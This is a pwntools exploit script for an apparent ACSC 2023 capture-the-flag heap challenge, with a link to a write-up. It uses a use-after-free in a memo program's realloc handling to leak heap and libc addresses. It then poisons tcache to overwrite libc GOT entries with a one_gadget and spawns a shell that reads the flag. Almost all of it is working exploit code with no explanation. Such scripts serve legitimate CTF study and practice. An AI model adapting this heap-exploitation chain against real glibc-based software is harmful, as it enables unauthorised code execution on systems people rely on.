from pwn import *
context.binary=e=ELF("./chall")
libc=e.libc
gs="""
b *__run_exit_handlers+211
b *calloc+678
b __GI___libc_reallocarray
b *realloc+1153
"""
if args.DEBUG:
    context.log_level='debug'
if args.LOCAL:
    p=e.process()
    if args.GDB:
        gdb.attach(p,gdbscript=gs)
        pause()
elif args.REMOTE:
    p=remote(args.HOST,int(args.PORT))

def Edit(idx: int,size: int,memo: bytes,sendline=True):
    p.sendlineafter(b">",b"1")
    p.sendlineafter(b"Index:",f"{idx}".encode())
    p.sendlineafter(b"Size:",f"{size}".encode())
    if size>1:
        p.sendafter(b"Memo:",memo)
    sleep(0.5)

def List():
    p.sendlineafter(b">",b"2")

Edit(0,0x78,b"A"*8)
Edit(0,0,0)
Edit(1,0x78,b"A"*8)
Edit(0,0,0)
List()
p.recvuntil(b"[1] ")
first_chunk=int(p.recv(5)[::-1].hex(),16)
first_chunk = (first_chunk << 12) +0x290
log.info(f"{hex(first_chunk)}")
tcache_perthread_struct=first_chunk-0x290
Edit(1,0x78,p64(0)*2)
Edit(0,0,0)
Edit(1,0x78,p64(((first_chunk+0x10) >> 12 ) ^ (tcache_perthread_struct+0x10))+p64(0))
Edit(2,0x78,b"A"*8)
Edit(3,0x78,p16(7)*58)
Edit(3,0x78,p16(0)*6+p16(7))
Edit(4,0x68,p64(0)*6+p64(tcache_perthread_struct+0x160))
Edit(5,0x78,b"X")
Edit(6,0x58,b"Khongduocthicut")
List()
p.recvuntil(b"[5] ")
libc.address=int(p.recv(6)[::-1].hex(),16)-0x219ce0
puts_abs_got=libc.address+0x219098
realloc_abs_got=libc.address+0x219160
log.info(f"libc @ {hex(libc.address)}")
Edit(3,0x78,p16(0)*6+p16(7))
Edit(4,0x68,p64(0)*6+p64(realloc_abs_got))
Edit(7,0x78,p64(libc.address+0xebcf8))

Edit(4,0x68,p64(0)*6+p64(puts_abs_got-8))
Edit(8,0x78,p64(0)+p64(libc.sym.realloc+1153))

p.sendline(b"cat flag*")
p.interactive()

# https://robbert1978.github.io/posts/Re-Acsc-2023/